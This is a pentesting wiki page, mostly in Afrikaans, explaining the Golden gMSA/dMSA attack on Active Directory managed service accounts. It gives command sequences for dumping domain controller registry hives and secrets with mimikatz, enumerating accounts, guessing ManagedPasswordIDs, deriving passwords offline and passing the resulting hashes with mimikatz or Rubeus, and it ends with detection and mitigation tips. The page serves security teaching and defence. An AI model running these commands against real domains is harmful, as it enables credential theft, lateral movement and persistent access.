# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Windows Managed Service Accounts (MSA) is spesiale principals wat ontwerp is om dienste te laat loop sonder dat hul wagwoorde handmatig bestuur hoef te word.
Daar is twee hoofvariante:

1. **gMSA** – group Managed Service Account – kan op verskeie hosts gebruik word wat in sy `msDS-GroupMSAMembership`-attribute gemagtig is.
2. **dMSA** – delegated Managed Service Account – die (preview) opvolger van gMSA, wat op dieselfde kriptografie staatmaak maar meer fynkorrelige delegation-scenario's moontlik maak.

Vir beide variante word die **wagwoord nie** op elke Domain Controller (DC) soos 'n gewone NT-hash gestoor nie. In plaas daarvan kan elke DC die huidige wagwoord on-the-fly deriveer uit:

* Die forest-wye **KDS Root Key** (`KRBTGT\KDS`)  – 'n lukraak gegenereerde GUID-genaamde secret, gerepliseer na elke DC onder die `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`-container.
* Die target account se **SID**.
* 'n Per-account **ManagedPasswordID** (GUID) wat in die `msDS-ManagedPasswordId`-attribute gevind word.

Die derivation is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob wat uiteindelik **base64-encoded** word en in die `msDS-ManagedPassword`-attribute gestoor word.
Geen Kerberos-verkeer of domain interaction word tydens normale wagwoordgebruik vereis nie – 'n member host deriveer die wagwoord plaaslik solank dit die drie inputs ken.

## Golden gMSA / Golden dMSA Attack

As 'n attacker al drie inputs **offline** kan bekom, kan hulle **geldige huidige en toekomstige wagwoorde** vir **enige gMSA/dMSA in die forest** bereken sonder om weer met die DC te kommunikeer, en die volgende omseil:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Wagwoord-change intervals (hulle kan dit vooraf bereken)

Dit is soortgelyk aan 'n *Golden Ticket* vir service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Vereistes

1. **Forest-level compromise** van **een DC** (of Enterprise Admin), of `SYSTEM`-toegang tot een van die DC's in die forest.
2. Die vermoë om service accounts te enumerate (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64 workstation om [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) of ekwivalente code uit te voer.

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Dump vanaf enige DC (Volume Shadow Copy / raw SAM+SECURITY hives of remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Die base64-string gemerk `RootKey` (GUID-naam) word in latere stappe benodig.<sup>[[1]](#references)[[2]](#references)</sup>

##### Fase 2 – Enumerateer gMSA / dMSA-objekte

Haal ten minste `sAMAccountName`, `objectSid` en `msDS-ManagedPasswordId` op:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementeer helper modes:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Guess / Discover die ManagedPasswordID (wanneer dit ontbreek)

Sommige deployments *strip* `msDS-ManagedPasswordId` uit ACL-beskermde reads.
Omdat die GUID 128-bis is, is naïewe bruteforce onuitvoerbaar, maar:

1. Die eerste **32 bisse = Unix epoch time** van die skepping van die account (minute-resolusie).
2. Gevolg deur 96 random bisse.

Daarom is ’n **nou wordlist per account** (± ’n paar uur) realisties.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Die hulpmiddel bereken kandidaatwagwoorde en vergelyk hul base64-blob met die werklike `msDS-ManagedPassword`-attribuut – die passing onthul die korrekte GUID.

##### Fase 4 – Offline Wagwoordberekening en -omskakeling

Sodra die ManagedPasswordID bekend is, is die geldige wagwoord slegs een command weg:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Die gevolglike hashes kan met **mimikatz** (`sekurlsa::pth`) of **Rubeus** ingespuit word vir Kerberos-abuse, wat stealth **lateral movement** en **persistence** moontlik maak.

## Opsporing en versagting

* Beperk **DC backup and registry hive read**-vermoëns tot Tier-0-administrateurs.
* Monitor **Directory Services Restore Mode (DSRM)**- of **Volume Shadow Copy**-skepping op DCs.
* Oudit leesbewerkings / veranderinge aan `CN=Master Root Keys,…` en `userAccountControl`-vlae van diensrekeninge.
* Bespeur ongewone **base64 password writes** of skielike hergebruik van dienswagwoorde oor hosts heen.
* Oorweeg dit om hoëvoorreg-gMSAs na **classic service accounts** met gereelde, ewekansige rotasies om te skakel waar Tier-0-isolasie nie moontlik is nie.

## Gereedskap

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – verwysingsimplementering wat op hierdie bladsy gebruik word.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – verwysingsimplementering wat op hierdie bladsy gebruik word.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket met behulp van afgeleide AES-sleutels.

## Verwysings

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
